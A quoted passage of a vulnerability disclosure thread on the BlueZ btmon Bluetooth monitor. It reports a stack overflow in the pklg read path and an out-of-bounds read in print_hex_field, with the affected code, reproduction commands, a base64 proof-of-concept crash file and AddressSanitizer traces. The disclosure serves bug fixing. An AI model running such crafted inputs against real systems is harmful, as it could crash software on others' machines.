+>> 368                 *index =3D 0xffff;
+>> 369                 *opcode =3D 0xffff;
+>> 370                 break;
+>> 371         }
+>> 372
+>> 373         len =3D read(btsnoop->fd, data, toread);
+>> 374         if (len < 0) {
+>> 375                 btsnoop->aborted =3D true;
+>> 376                 return false;
+>> 377         }
+>>
+>>
+>>
+>> Repeat-By:
+>> echo <above base64> > PoC.64
+>> base64 -d PoC.b64 > PoC.file
+>> valgrind ./monitor/btmon -r PoC.file
+>>
+>>
+>> ASAN Report (bluez  needs to compiled with -fsanitize=3Daddress for this=
+):
+>>
+>> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+>> =3D=3D1986=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on addres=
+s 0x73f4d87b94c2 at pc 0x663b1aef59b6 bp 0x73f4d87b8c50 sp 0x73f4d87b8c38
+>> WRITE of size 1491 at 0x73f4d87b94c2 thread T0
+>>     #0 0x663b1aef59b5 in read (/usr/lib/x86_64-linux-gnu/libasan.so.1+0x=
+299b5)
+>>     #1 0x544a17 in pklg_read_hci src/shared/btsnoop.c:373
+>>     #2 0x544a17 in btsnoop_read_hci src/shared/btsnoop.c:433
+>>     #3 0x417efd in control_reader monitor/control.c:1408
+>>     #4 0x40a142 in main monitor/main.c:220
+>>     #5 0x663b1a933b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.s=
+o.6+0x21b44)
+>>     #6 0x40b03e (/opt/bluez/monitor/btmon+0x40b03e)
+>>
+>> Address 0x73f4d87b94c2 is located in stack of thread T0 at offset 1778 i=
+n frame
+>>     #0 0x417b4f in control_reader monitor/control.c:1375
+>>
+>>   This frame has 5 object(s):
+>>     [32, 34) 'pktlen'
+>>     [96, 98) 'index'
+>>     [160, 162) 'frequency'
+>>     [224, 240) 'tv'
+>>     [288, 1778) 'buf' <=3D=3D Memory access at offset 1778 overflows thi=
+s variable
+>> HINT: this may be a false positive if your program uses some custom stac=
+k unwind mechanism or swapcontext
+>>       (longjmp and C++ exceptions *are* supported)
+>> SUMMARY: AddressSanitizer: stack-buffer-overflow ??:0 read
+>> Shadow bytes around the buggy address:
+>>   0x0e7f1b0ef240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef270: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> =3D>0x0e7f1b0ef290: 00 00 00 00 00 00 00 00[02]f4 f3 f3 f3 f3 00 00
+>>   0x0e7f1b0ef2a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
+>>   0x0e7f1b0ef2b0: f1 f1 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef2c0: 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef2d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0e7f1b0ef2e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> Shadow byte legend (one shadow byte represents 8 application bytes):
+>>   Addressable:           00
+>>   Partially addressable: 01 02 03 04 05 06 07
+>>   Heap left redzone:       fa
+>>   Heap right redzone:      fb
+>>   Freed heap region:       fd
+>>   Stack left redzone:      f1
+>>   Stack mid redzone:       f2
+>>   Stack right redzone:     f3
+>>   Stack partial redzone:   f4
+>>   Stack after return:      f5
+>>   Stack use after scope:   f8
+>>   Global redzone:          f9
+>>   Global init order:       f6
+>>   Poisoned by user:        f7
+>>   Contiguous container OOB:fc
+>>   ASan internal:           fe
+>> =3D=3D1986=3D=3DABORTING
+>
+>> Machine: x86_64
+>> OS: linux-gnu
+>> Compiler: gcc
+>> Compilation CFLAGS:  -O0 -ggdb3 -fsanitize=3Daddress
+>> Machine Type: x86_64-unknown-linux-gnu
+>> BlueZ Version: 5.42
+>> Release Status: release
+>> Source: http://www.kernel.org/pub/linux/bluetooth/bluez-5.42.tar.xz
+>>
+>> Description:
+>>
+>> A out-of-bound read was identified in "print_hex_field" function in "mon=
+itor/packet.c" source file. This issue can be triggered by processing a cor=
+rupted dump file and will result in hcidump crash. To replicate this issue =
+use the attached sample below and execute the following command:
+>>
+>> ./monitor/btmon -r <PoC File>
+>>
+>>
+>> PoC.file base64 encoded:
+>>
+>> AAAADCQkLv9/AIAAARUB3QAAAAwdJCT/f4gAAQE=3D
+>>
+>>
+>>
+>> Affected code:
+>>
+>>  1908 static void print_hex_field(const char *label, const uint8_t *data=
+,
+>>  1909                                                                 ui=
+nt8_t le      n)
+>>  1910 {
+>>  1911         char str[len * 2 + 1];
+>>  1912         uint8_t i;
+>>  1913
+>>  1914         str[0] =3D '\0';
+>>  1915
+>>  1916         for (i =3D 0; i < len; i++)
+>>  1917                 sprintf(str + (i * 2), "%2.2x", data[i]);
+>>  1918
+>>
+>>
+>>
+>>
+>> Repeat-By:
+>> echo <above base64> > PoC.64
+>> base64 -d PoC.b64 > PoC.file
+>> valgrind ./monitor/btmon -r PoC.file
+>>
+>>
+>> ASAN Report (bluez  needs to compiled with -fsanitize=3Daddress for this=
+):
+>>
+>> =3D=3D17737=3D=3DERROR: AddressSanitizer: stack-buffer-overflow on addre=
+ss 0x77c32d2411a2 at pc 0x431421 bp 0x77c32d240700 sp 0x77c32d2406f8
+>> READ of size 1 at 0x77c32d2411a2 thread T0
+>>     #0 0x431420 in print_hex_field monitor/packet.c:1917
+>>     #1 0x44428d in print_key monitor/packet.c:1924
+>>     #2 0x44428d in print_link_key monitor/packet.c:1929
+>>     #3 0x44428d in return_link_keys_evt monitor/packet.c:7803
+>>     #4 0x47d5f8 in packet_hci_event monitor/packet.c:9072
+>>     #5 0x483025 in packet_monitor monitor/packet.c:3843
+>>     #6 0x417f68 in control_reader monitor/control.c:1415
+>>     #7 0x40a142 in main monitor/main.c:220
+>>     #8 0x74bb760f0b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.s=
+o.6+0x21b44)
+>>     #9 0x40b03e (/opt/bluez/monitor/btmon+0x40b03e)
+>>
+>> Address 0x77c32d2411a2 is located in stack of thread T0 at offset 1778 i=
+n frame
+>>     #0 0x417b4f in control_reader monitor/control.c:1375
+>>
+>>   This frame has 5 object(s):
+>>     [32, 34) 'pktlen'
+>>     [96, 98) 'index'
+>>     [160, 162) 'frequency'
+>>     [224, 240) 'tv'
+>>     [288, 1778) 'buf' <=3D=3D Memory access at offset 1778 overflows thi=
+s variable
+>> HINT: this may be a false positive if your program uses some custom stac=
+k unwind mechanism or swapcontext
+>>       (longjmp and C++ exceptions *are* supported)
+>> SUMMARY: AddressSanitizer: stack-buffer-overflow monitor/packet.c:1917 p=
+rint_hex_field
+>> Shadow bytes around the buggy address:
+>>   0x0ef8e5a401e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a401f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a40200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a40210: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a40220: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> =3D>0x0ef8e5a40230: 00 00 00 00[02]f4 f3 f3 f3 f3 00 00 00 00 00 00
+>>   0x0ef8e5a40240: 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00
+>>   0x0ef8e5a40250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f3 f3
+>>   0x0ef8e5a40260: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a40270: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>>   0x0ef8e5a40280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>> Shadow byte legend (one shadow byte represents 8 application bytes):
+>>   Addressable:           00
+>>   Partially addressable: 01 02 03 04 05 06 07
+>>   Heap left redzone:       fa
+>>   Heap right redzone:      fb
+>>   Freed heap region:       fd
+>>   Stack left redzone:      f1
+>>   Stack mid redzone:       f2
+>>   Stack right redzone:     f3
+>>   Stack partial redzone:   f4
+>>   Stack after return:      f5
+>>   Stack use after scope:   f8
+>>   Global redzone:          f9
+>>   Global init order:       f6
+>>   Poisoned by user:        f7
+>>   Contiguous container OOB:fc
+>>   ASan internal:           fe
+>> =3D=3D17737=3D=3DABORTING
+>>
+>
